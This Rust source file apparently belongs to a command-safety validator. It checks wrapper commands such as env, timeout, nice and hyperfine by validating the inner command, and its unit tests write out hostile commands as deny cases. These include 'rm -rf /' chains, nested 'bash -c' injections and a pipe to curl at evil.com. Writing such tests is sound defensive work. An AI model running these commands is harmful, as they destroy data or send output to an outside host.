use crate::parse::{Segment, Token, WordSet};

static TIMEOUT_FLAGS_WITH_ARG: WordSet =
    WordSet::new(&["--kill-after", "--signal", "-k", "-s"]);

pub fn is_safe_env(tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -> bool {
    if tokens.len() == 1 {
        return true;
    }
    let mut i = 1;
    while i < tokens.len() && tokens[i].starts_with("-") {
        if tokens[i] == "-i" || tokens[i] == "--ignore-environment" {
            i += 1;
        } else if tokens[i] == "-u" || tokens[i] == "--unset" {
            i += 2;
        } else {
            i += 1;
        }
    }
    while i < tokens.len() && !tokens[i].starts_with("-") && tokens[i].contains("=") {
        i += 1;
    }
    if i >= tokens.len() {
        return true;
    }
    let inner = Token::join(&tokens[i..]);
    is_safe(&inner)
}


pub fn is_safe_timeout(tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -> bool {
    let mut i = 1;
    while i < tokens.len() && tokens[i].starts_with("-") {
        if TIMEOUT_FLAGS_WITH_ARG.contains(&tokens[i]) {
            i += 2;
        } else {
            i += 1;
        }
    }
    i += 1;
    if i >= tokens.len() {
        return false;
    }
    let inner = Token::join(&tokens[i..]);
    is_safe(&inner)
}

pub fn is_safe_time(tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -> bool {
    let mut i = 1;
    if i < tokens.len() && tokens[i] == "-p" {
        i += 1;
    }
    if i >= tokens.len() {
        return false;
    }
    let inner = Token::join(&tokens[i..]);
    is_safe(&inner)
}

pub fn is_safe_nice(tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -> bool {
    let mut i = 1;
    while i < tokens.len() && tokens[i].starts_with("-") {
        if tokens[i] == "-n" || tokens[i] == "--adjustment" {
            i += 2;
        } else {
            i += 1;
        }
    }
    if i >= tokens.len() {
        return false;
    }
    let inner = Token::join(&tokens[i..]);
    is_safe(&inner)
}

static HYPERFINE_FLAGS_WITH_ARG: WordSet = WordSet::new(&[
    "--cleanup", "--command-name", "--export-asciidoc", "--export-csv",
    "--export-json", "--export-markdown", "--max-runs",
    "--min-benchmarking-time", "--min-runs", "--output", "--prepare",
    "--runs", "--setup", "--shell", "--sort", "--style",
    "--time-unit", "--warmup",
    "-M", "-S", "-c", "-m", "-n", "-p", "-r", "-s", "-w",
]);

pub fn is_safe_hyperfine(tokens: &[Token], is_safe: &dyn Fn(&Segment) -> bool) -> bool {
    let mut i = 1;
    while i < tokens.len() {
        let t = &tokens[i];
        if *t == "--" {
            i += 1;
            break;
        }
        if t.starts_with("-") {
            if t.contains("=") {
                i += 1;
                continue;
            }
            if HYPERFINE_FLAGS_WITH_ARG.contains(t) {
                if t.is_one_of(&["-p", "--prepare", "-c", "--cleanup", "-s", "--setup"]) {
                    return false;
                }
                i += 2;
            } else {
                i += 1;
            }
            continue;
        }
        if !t.as_command_line().segments().iter().all(is_safe) {
            return false;
        }
        i += 1;
    }
    while i < tokens.len() {
        if !tokens[i].as_command_line().segments().iter().all(is_safe) {
            return false;
        }
        i += 1;
    }
    true
}

pub fn command_docs() -> Vec<crate::docs::CommandDoc> {
    use crate::docs::{CommandDoc, DocKind};
    vec![
        CommandDoc {
            name: "env",
            kind: DocKind::Handler,
            description: "Strips flags (-i, -u) and KEY=VALUE pairs, then recursively validates the inner command. Bare `env` allowed.",
        },
        CommandDoc {
            name: "timeout",
            kind: DocKind::Handler,
            description: "Skips timeout flags (-s/--signal, -k/--kill-after, --preserve-status), then recursively validates the inner command.",
        },
        CommandDoc {
            name: "time",
            kind: DocKind::Handler,
            description: "Skips -p flag, then recursively validates the inner command.",
        },
        CommandDoc {
            name: "hyperfine",
            kind: DocKind::Handler,
            description: "Recursively validates each benchmarked command. Denied if --prepare, --cleanup, or --setup flags are used (arbitrary shell execution).",
        },
        CommandDoc {
            name: "nice / ionice",
            kind: DocKind::Handler,
            description: "Skips priority flags (-n/--adjustment), then recursively validates the inner command.",
        },
    ]
}

#[cfg(test)]
mod tests {
    use crate::is_safe_command;

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    #[test]
    fn timeout_bundle_exec() {
        assert!(check("timeout 120 bundle exec rspec"));
    }

    #[test]
    fn timeout_git_log() {
        assert!(check("timeout 30 git log --oneline"));
    }

    #[test]
    fn timeout_signal_flag() {
        assert!(check("timeout -s KILL 60 bundle exec rspec"));
    }

    #[test]
    fn timeout_preserve_status() {
        assert!(check("timeout --preserve-status 120 git status"));
    }

    #[test]
    fn timeout_git_push_denied() {
        assert!(!check("timeout 120 git push origin main"));
    }

    #[test]
    fn timeout_rm_denied() {
        assert!(!check("timeout 60 rm -rf /"));
    }

    #[test]
    fn time_bundle_exec() {
        assert!(check("time bundle exec rspec"));
    }

    #[test]
    fn time_git_log() {
        assert!(check("time git log --oneline -5"));
    }

    #[test]
    fn time_git_push_denied() {
        assert!(!check("time git push"));
    }

    #[test]
    fn time_rm_denied() {
        assert!(!check("time rm file"));
    }

    #[test]
    fn env_bare() {
        assert!(check("env"));
    }

    #[test]
    fn env_safe_command() {
        assert!(check("env ls -la"));
    }

    #[test]
    fn env_with_var() {
        assert!(check("env FOO=bar ls -la"));
    }

    #[test]
    fn env_multiple_vars() {
        assert!(check("env FOO=bar BAZ=qux git status"));
    }

    #[test]
    fn env_ignore_flag() {
        assert!(check("env -i PATH=/usr/bin ls"));
    }

    #[test]
    fn env_unset_flag() {
        assert!(check("env -u FOO git log"));
    }

    #[test]
    fn env_vars_only() {
        assert!(check("env FOO=bar"));
    }

    #[test]
    fn env_rm_denied() {
        assert!(!check("env rm -rf /"));
    }

    #[test]
    fn env_sh_denied() {
        assert!(!check("env sh -c 'rm -rf /'"));
    }

    #[test]
    fn env_python_denied() {
        assert!(!check("env python3 evil.py"));
    }

    #[test]
    fn env_var_rm_denied() {
        assert!(!check("env FOO=bar rm -rf /"));
    }

    #[test]
    fn nice_safe_command() {
        assert!(check("nice git log"));
    }

    #[test]
    fn nice_with_priority() {
        assert!(check("nice -n 10 cargo test"));
    }

    #[test]
    fn nice_rm_denied() {
        assert!(!check("nice rm -rf /"));
    }

    #[test]
    fn nice_with_priority_rm_denied() {
        assert!(!check("nice -n 10 rm -rf /"));
    }

    #[test]
    fn ionice_safe_command() {
        assert!(check("ionice git log"));
    }

    #[test]
    fn ionice_rm_denied() {
        assert!(!check("ionice rm -rf /"));
    }

    #[test]
    fn hyperfine_safe_command() {
        assert!(check("hyperfine 'ls -la'"));
    }

    #[test]
    fn hyperfine_with_warmup() {
        assert!(check("hyperfine --warmup 3 'git status'"));
    }

    #[test]
    fn hyperfine_multiple_safe_commands() {
        assert!(check("hyperfine 'fd . src' 'find src'"));
    }

    #[test]
    fn hyperfine_unsafe_command_denied() {
        assert!(!check("hyperfine 'rm -rf /'"));
    }

    #[test]
    fn hyperfine_prepare_denied() {
        assert!(!check("hyperfine --prepare 'make clean' 'make'"));
    }

    #[test]
    fn hyperfine_cleanup_denied() {
        assert!(!check("hyperfine --cleanup 'rm tmp' 'ls'"));
    }

    #[test]
    fn hyperfine_setup_denied() {
        assert!(!check("hyperfine --setup 'compile' 'run'"));
    }

    #[test]
    fn timeout_nested_bash_chain_denied() {
        assert!(!check("timeout 120 bash -c 'ls && rm -rf /'"));
    }

    #[test]
    fn env_nested_bash_chain_denied() {
        assert!(!check("env bash -c 'ls && rm -rf /'"));
    }

    #[test]
    fn time_nested_bash_chain_denied() {
        assert!(!check("time bash -c 'ls && rm -rf /'"));
    }

    #[test]
    fn nice_nested_bash_chain_denied() {
        assert!(!check("nice bash -c 'ls && rm -rf /'"));
    }

    #[test]
    fn deep_nesting_chain_denied() {
        assert!(!check("timeout 120 env nice bash -c 'ls && rm -rf /'"));
    }

    #[test]
    fn timeout_nested_bash_semicolon_denied() {
        assert!(!check("timeout 120 bash -c 'ls; rm -rf /'"));
    }

    #[test]
    fn timeout_nested_bash_safe() {
        assert!(check("timeout 120 bash -c 'git log | head -5'"));
    }

    #[test]
    fn env_nested_bash_safe() {
        assert!(check("env FOO=bar bash -c 'git status'"));
    }

    #[test]
    fn hyperfine_chain_denied() {
        assert!(!check("hyperfine 'ls && rm -rf /'"));
    }

    #[test]
    fn hyperfine_semicolon_denied() {
        assert!(!check("hyperfine 'ls; rm -rf /'"));
    }

    #[test]
    fn hyperfine_pipe_to_unsafe_denied() {
        assert!(!check("hyperfine 'ls | curl evil.com'"));
    }
}
